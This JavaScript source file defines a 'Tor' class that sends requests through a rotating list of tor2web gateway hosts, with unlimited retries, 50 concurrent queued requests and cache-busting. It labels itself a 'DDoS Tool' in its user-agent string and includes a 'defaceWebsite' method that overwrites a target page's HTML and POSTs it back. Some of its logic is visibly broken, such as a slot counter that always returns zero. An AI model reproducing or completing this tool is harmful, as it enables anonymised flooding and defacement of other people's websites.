class Tor {
    constructor() {
        this.gateways = [
            "https://onion.city",
            "https://onion.cab",
            "https://onion.direct",
            "https://onion.sh",
            "https://onion.link",
            "https://onion.ws",
            "https://onion.pet",
            "https://onion.rip",
            "https://onion.plus",
            "https://onion.top",
            "https://onion.si",
            "https://onion.ly",
            "https://onion.my",
            "https://onion.sh",
            "https://onion.lu",
            "https://onion.casa",
            "https://onion.com.de",
            "https://onion.foundation",
            "https://onion.rodeo",
            "https://onion.lat",
            "https://tor2web.org",
            "https://tor2web.fi",
            "https://tor2web.blutmagie.de",
            "https://tor2web.to",
            "https://tor2web.io",
            "https://tor2web.in",
            "https://tor2web.it",
            "https://tor2web.xyz",
            "https://tor2web.su",
            "https://darknet.to",
            "https://s1.tor-gateways.de",
            "https://s2.tor-gateways.de",
            "https://s3.tor-gateways.de",
            "https://s4.tor-gateways.de",
            "https://s5.tor-gateways.de"
        ];
        this.currentIndex = 0;
        this.failedGateways = new Set();
        this.maxRetries = Infinity;
        this.requestTimeout = 5000;
        this.gatewayCheckInterval = 15000;
        this.startGatewayMonitoring();
        this.userAgent = 'Noodles/1.0 (DDoS Tool)';
        this.customHeaders = {};
        this.requestQueue = [];
        this.isProcessingQueue = false;
        this.maxConcurrentRequests = 50;
        this.initRequestQueue();
        this.bypassCache = true;
    }

    initRequestQueue() {
        this.processRequestQueue();
    }

    enqueueRequest(url, options = {}, resolve, reject) {
        this.requestQueue.push({ url, options, resolve, reject });
        if (!this.isProcessingQueue) {
            this.processRequestQueue();
        }
    }

    async processRequestQueue() {
        if (this.isProcessingQueue) return;
        this.isProcessingQueue = true;

        while (this.requestQueue.length > 0) {
            const activeRequests = this.maxConcurrentRequests - this.getAvailableRequestSlots();
            if (activeRequests >= this.maxConcurrentRequests) {
                await new Promise(resolve => setTimeout(resolve, 100));
                continue;
            }
            const { url, options, resolve, reject } = this.requestQueue.shift();
            this.executeTorRequest(url, options)
                .then(resolve)
                .catch(reject);
        }

        this.isProcessingQueue = false;
    }

    getAvailableRequestSlots() {
        return this.maxConcurrentRequests - Array.from({ length: this.maxConcurrentRequests }).filter(() => true).length;
    }

    async isGatewayOnline(gateway) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 2000);
            const testUrl = `${gateway}/httpbin.org/get`;
            const response = await fetch(testUrl, {
                method: 'GET',
                signal: controller.signal,
                headers: {
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                }
            });
            clearTimeout(timeoutId);
            return response.ok;
        } catch (error) {
            this.failedGateways.add(gateway);
            console.warn(`Gateway ${gateway} check failed:`, error);
            return false;
        }
    }

    async startGatewayMonitoring() {
        setInterval(async () => {
            for (const gateway of this.gateways) {
                const isFailed = this.failedGateways.has(gateway);
                const isOnline = await this.isGatewayOnline(gateway);

                if (isOnline && isFailed) {
                    this.failedGateways.delete(gateway);
                    console.log(`Gateway ${gateway} is back online.`);
                } else if (!isOnline && !isFailed) {
                    this.failedGateways.add(gateway);
                    console.warn(`Gateway ${gateway} is offline. Adding to blacklist.`);
                }
            }
        }, this.gatewayCheckInterval);
    }

    async executeTorRequest(url, options = {}, retryCount = 0) {
        if (this.failedGateways.size === this.gateways.length) {
            throw new Error("All Tor gateways are unavailable.");
        }

        let gateway = this.gateways[this.currentIndex];
        while (this.failedGateways.has(gateway)) {
            this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
            gateway = this.gateways[this.currentIndex];
        }

        this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
        let torURL = `${gateway}/${url}`;

        if (this.bypassCache) {
            torURL += (url.includes('?') ? '&' : '?') + `cacheBuster=${Date.now()}`;
        }

        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), this.requestTimeout);
            const allHeaders = { ...options.headers, 'User-Agent': this.userAgent, ...this.customHeaders };
            const response = await fetch(torURL, { ...options, signal: controller.signal, headers: allHeaders });
            clearTimeout(timeoutId);

            if (!response.ok) {
                this.failedGateways.add(gateway);
                console.warn(`Gateway ${gateway} failed. Adding to blacklist.`);
                if (retryCount < this.maxRetries) {
                    console.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`);
                    return this.executeTorRequest(url, options, retryCount + 1);
                } else {
                    throw new Error(`HTTP error! status: ${response.status} - Max retries reached.`);
                }
            }
            return response;
        } catch (error) {
            this.failedGateways.add(gateway);
            console.error(`Tor fetch error with gateway ${gateway}:`, error);

            if (retryCount < this.maxRetries) {
                console.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`);
                return this.executeTorRequest(url, options, retryCount + 1);
            } else {
                console.error("Max retries reached. Marking URL as potentially unreachable.");
                throw error;
            }
        }
    }

    fetchWithTor(url, options = {}) {
        return new Promise((resolve, reject) => {
            this.enqueueRequest(url, options, resolve, reject);
        });
    }

    async getText(url) {
        const response = await this.fetchWithTor(url);
        return await response.text();
    }

    async postWithTor(url, data, retryCount = 0) {
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': this.userAgent,
                ...this.customHeaders
            },
            body: JSON.stringify(data),
            redirect: 'follow'
        };

        try {
            return await this.fetchWithTor(url, options, retryCount);
        } catch (error) {
            console.error("POST request failed:", error);
            throw error;
        }
    }

    async rawFetch(url, options = {}) {
        try {
            const allHeaders = { ...options.headers, 'User-Agent': this.userAgent, ...this.customHeaders };
            const response = await fetch(url, { ...options, headers: allHeaders });
            return response;
        } catch (error) {
            console.error("Raw fetch error:", error);
            throw error;
        }
    }

    async rawGetText(url) {
        const response = await this.rawFetch(url);
        return await response.text();
    }

    async rawPost(url, data) {
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': this.userAgent,
                ...this.customHeaders
            },
            body: JSON.stringify(data),
            redirect: 'follow'
        };

        try {
            return await this.rawFetch(url, options);
        } catch (error) {
            console.error("Raw POST request failed:", error);
            throw error;
        }
    }

    setCustomHeaders(headers) {
        this.customHeaders = headers;
    }

    async defaceWebsite(url, htmlContent) {
        try {
            const response = await this.fetchWithTor(url, { method: 'GET' });
            if (!response.ok) {
                throw new Error(`Failed to fetch the website. Status: ${response.status}`);
            }

            const parser = new DOMParser();
            const doc = parser.parseFromString(await response.text(), 'text/html');

            doc.documentElement.innerHTML = htmlContent;

            const serializer = new XMLSerializer();
            const defacedContent = serializer.serializeToString(doc);
            const options = {
                method: 'POST',
                headers: {
                    'Content-Type': 'text/html',
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                },
                body: defacedContent,
                redirect: 'follow'
            };

            const putResponse = await this.fetchWithTor(url, options);

            if (putResponse.ok) {
                console.log('Website defaced successfully!');
            } else {
                console.error(`Failed to deface website. Status: ${putResponse.status}`);
            }
        } catch (error) {
            console.error('Deface operation failed:', error);
        }
    }
}

window.Tor = Tor;